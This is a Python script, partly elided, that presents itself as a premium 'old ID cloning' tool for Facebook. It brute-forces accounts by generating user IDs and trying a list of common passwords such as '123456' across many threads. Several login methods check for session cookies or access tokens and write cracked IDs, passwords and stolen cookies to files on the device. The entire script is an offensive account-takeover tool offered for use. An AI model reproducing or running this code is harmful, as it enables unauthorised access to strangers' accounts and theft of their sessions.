# SCRIPTS CREATE BY RAKIB HASAN ROKY
#---------------------------| Import |---------------------------#
...
#---------------------------| Logo |---------------------------#
logo=(f'''
{G}____ ____ _  _ _ ___  _  _ ____ ____ ____ _  _ 
|__/ |__| |_/  | |__] |__| |__| [__  |__| |\ | 
|  \ |  | | \_ | |__] |  | |  | ___] |  | | \|.{R}ROKY-009
{A}─────────────────────────────────────────────────\n{A}|{R}={A}| {G}OWNER  :{R} {xd} RAKIB HASAN ROKY \n{A}|{R}={A}| {G} TOOL  :{R} {xd} OLD-ID{xd}CLONING\n{A}|{R}={A}| {G}STATUS :{R} {xd} PRE{G}M{W}IUM
{A}─────────────────────────────────────────────────''')
#---------------------------| Menux |---------------------------#
def _____menux_____():
	clear()
	print(f"{white}<|1|> OLD CLONING");print(f"{white}<|2|> EXIT ");linex();option=input(f"{white}<|?|> CHOICE >> ")
	if option in ["*"]:_____randmx_____()
	if option in ["1"]:_____oldx_____()
	if option in ["2"]:sys.exit()
	else:exit()
#---------------------------| Random |---------------------------#
...
def _____oldx_____():
	...
	with tred(max_workers=30) as ASRAFULx:
		...
		for love in user:
			uid=str("10000"+love);pas=['123456","1234567","12345678","1234567890","123456789","112233","111111","987654321","222222","123123","11223344","786786","102030']
			ASRAFULx.submit(____old____,uid,pas,tl)
	print("");linex();print(f"{white}<|●|> CLONING COMPLETE BROTHER ");print(f'{white}<|●|> TOTAL OK>> '+str(len(ok)));print(f'{white}<|●|> TOTAL CP >> '+str(len(cp)));linex();exit()
#---------------------------| Random Method 1 |---------------------------#
def ____M1____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ROKY-M1|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
		...
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ROKY-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ROKY-RANDM-M1-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|ROKY-CP|> {idf} ● {pw} ")
				open('/sdcard/ROKY-RANDN-M1-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
...
def ____M2____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ROKY-M2|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ROKY-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ROKY-RANDM-M2-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|ROKY-CP|> {idf} ● {pw} ")
				open('/sdcard/ROKY-RANDN-M2-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M3____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ROKY-M3|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ROKY-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ROKY-RANDM-M3-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|ROKY-CP|> {idf} ● {pw} ")
				open('/sdcard/ROKY-RANDN-M3-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M4____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ROKY-M4|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ROKY-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ROKY-RANDM-M4-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|ROKY-CP|> {idf} ● {pw} ")
				open('/sdcard/ROKY-RANDN-M4-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M5____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ROKY-M5|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	try:
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|ROKY-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|MAL-OK|>{white} {kuki}")
					open('/sdcard/ROKY-RANDM-M5-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif 'www.facebook.com' in q['error']['message']:
				print(f"\r\r{ping}<|ROKY-CP|> {idf} ● {pw} ")
				open('/sdcard/ROKY-RANDN-M5-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
...
def ____M6____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|ROKY-M6|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	try:
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				print(f"\r\r{ping}<|ROKY-CP|> {idf} ● {pw} ")
				open('/sdcard/ROKY-RANDN-M6-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
	except Exception as e:
...
def ____old____(uid,pas,tl):
	global loop,ok
	sys.stdout.write(f"\r\r{white}<|ROKY-009|> <|{loop}|> <|{ok}|> ");sys.stdout.flush()
	try:
		for ps in pas:
			...
			if "Please Confirm Email" in str(po):
				print(f"\r\r{green}<|SUCCESS|> {uid} ● {ps}")
				open("/sdcard/ROKY-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
